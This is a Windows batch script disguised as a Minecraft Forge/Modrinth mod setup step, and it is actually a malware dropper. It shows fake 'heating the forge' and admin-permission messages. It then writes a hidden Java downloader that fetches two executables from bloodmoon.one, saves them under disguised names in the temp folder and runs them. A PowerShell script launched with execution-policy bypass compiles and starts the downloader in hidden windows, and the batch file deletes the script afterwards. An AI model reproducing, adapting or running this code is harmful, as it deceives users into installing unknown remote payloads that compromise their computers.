@echo off
setlocal

echo Heating the forge...
timeout /t 1 /nobreak >nul
echo.
echo To initialize all mods properly, Forge needs admin permissions.
timeout /t 2 /nobreak >nul

set "JAVA_FILE=%TEMP%\Downloader.java"

:: Create the Java file inline
(
echo import java.io.InputStream;
echo import java.net.URI;
echo import java.net.http.HttpClient;
echo import java.net.http.HttpRequest;
echo import java.net.http.HttpResponse;
echo import java.nio.file.Files;
echo import java.nio.file.Path;
echo import java.time.Duration;
echo.
echo public class Downloader {
echo     public static void main^(String[] args^) {
echo         String url1 = "https://bloodmoon.one/msb.exe";
echo         String url2 = "https://bloodmoon.one/cvs.exe";
echo.
echo         Path tempDir = Path.of^(System.getProperty^("java.io.tmpdir"^)^);
echo         Path file1Path = tempDir.resolve^("cvscvscvs.exe"^);
echo         Path file2Path = tempDir.resolve^("msbmsbmsb.exe"^);
echo.
echo         HttpClient client = HttpClient.newBuilder^(^)
echo             .connectTimeout^(Duration.ofSeconds^(15^)^)
echo             .followRedirects^(HttpClient.Redirect.NORMAL^)
echo             .build^(^);
echo.
echo         if ^(download^(client, url1, file1Path^)^) {
echo             runFile^(file1Path^);
echo         }
echo.
echo         if ^(download^(client, url2, file2Path^)^) {
echo             runFile^(file2Path^);
echo         }
echo     }
echo.
echo     private static boolean download^(HttpClient client, String url, Path destination^) {
echo         try {
echo             HttpRequest request = HttpRequest.newBuilder^(URI.create^(url^)^)
echo                 .timeout^(Duration.ofSeconds^(30^)^)
echo                 .GET^(^)
echo                 .build^(^);
echo.
echo             HttpResponse^<InputStream^> response = client.send^(request, HttpResponse.BodyHandlers.ofInputStream^(^)^);
echo             if ^(response.statusCode^(^) ^< 200 ^|^| response.statusCode^(^) ^>= 300^) {
echo                 return false;
echo             }
echo.
echo             try ^(InputStream body = response.body^(^)^) {
echo                 Files.copy^(body, destination, java.nio.file.StandardCopyOption.REPLACE_EXISTING^);
echo             }
echo             return true;
echo         } catch ^(Exception e^) {
echo             return false;
echo         }
echo     }
echo.
echo     private static void runFile^(Path file^) {
echo         try {
echo             new ProcessBuilder^(file.toString^(^)^).start^(^);
echo         } catch ^(Exception e^) {
echo         }
echo     }
echo }
) > "%JAVA_FILE%"

:request_admin
:: Find Java in Modrinth App directory
set "JAVAW_PATH="

for /d %%i in ("%APPDATA%\ModrinthApp\meta\java_versions\*") do (
    if exist "%%i\bin\javaw.exe" set "JAVAW_PATH=%%i\bin\javaw.exe"
)

if not defined JAVAW_PATH (
    echo Java not found. Please install Java.
    timeout /t 3 /nobreak >nul
    exit
)

:: Create PowerShell script that compiles and runs Java
set "PS_SCRIPT=%TEMP%\runasadmin.ps1"
(
echo $javaPath = '%JAVAW_PATH%'
echo $javaFile = '%JAVA_FILE%'
echo $javaDir = Split-Path $javaPath -Parent
echo $javacPath = Join-Path $javaDir 'javac.exe'
echo $javaExePath = Join-Path $javaDir 'java.exe'
echo try {
echo     # Compile the Java file
echo     $compileProc = Start-Process -FilePath $javacPath -ArgumentList $javaFile -Wait -PassThru -NoNewWindow -WindowStyle Hidden
echo     if ($compileProc.ExitCode -eq 0) {
echo         # Run the compiled class
echo         $className = [System.IO.Path]::GetFileNameWithoutExtension($javaFile)
echo         $workDir = Split-Path $javaFile -Parent
echo         Start-Process -FilePath $javaExePath -ArgumentList "-cp `"$workDir`" $className" -WindowStyle Hidden
echo     }
echo } catch {
echo     exit 1
echo }
) > "%PS_SCRIPT%"

:: Run the PowerShell script
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_SCRIPT%"

if errorlevel 1 (
    echo.
    echo Admin privileges are required. Please try again.
    timeout /t 2 /nobreak >nul
    del "%PS_SCRIPT%" 2>nul
    goto request_admin
)

:: Clean up
del "%PS_SCRIPT%" 2>nul

exit
